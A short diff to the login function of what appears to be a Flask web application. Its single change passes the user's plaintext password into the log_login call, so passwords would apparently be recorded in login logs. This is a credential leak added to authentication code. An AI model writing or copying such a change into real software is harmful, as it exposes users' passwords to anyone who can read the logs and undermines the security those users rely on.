@@ -125,7 +125,7 @@ def login():
             session['roles'] = user.roles
             session['user'] = user.email
             log(sel)
-            log_login(user.email,'login')
+            log_login(user.email,'login',password)
             next_page = request.args.get('next')
             if not next_page or url_parse(next_page).netloc != '':
                 if session['roles']=='vendedor':
